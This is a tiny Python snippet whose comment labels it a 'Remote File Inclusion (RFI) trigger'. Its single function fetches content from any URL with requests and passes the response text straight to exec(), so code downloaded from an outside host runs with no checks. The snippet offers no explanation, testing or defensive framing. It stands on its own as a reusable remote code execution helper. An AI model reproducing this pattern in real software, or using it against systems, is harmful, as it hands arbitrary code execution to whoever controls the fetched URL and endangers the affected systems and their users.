import requests

# Remote File Inclusion (RFI) trigger
def trigger_rfi(file_url):
    exec(requests.get(file_url).text)